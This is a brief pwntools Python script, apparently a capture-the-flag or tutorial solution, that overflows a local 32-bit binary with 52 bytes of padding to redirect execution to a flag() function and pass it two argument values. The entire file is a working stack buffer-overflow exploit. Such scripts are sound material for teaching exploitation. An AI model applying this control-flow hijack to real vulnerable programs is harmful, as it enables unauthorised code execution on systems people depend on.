#!/usr/bin/python3
from pwn import *

p = process('./vuln-32')

offset = 52
flag_addr = 0x080491c7

payload = flat(
    b'A' * offset,      # Padding to EIP
    flag_addr,          # flag() addr
    0x0,                # Return addr (don't care)
    0xdeadc0de,         # First param
    0xc0ded00d          # Second param
)

log.info(p.clean())
p.sendline(payload)
log.info(p.clean())
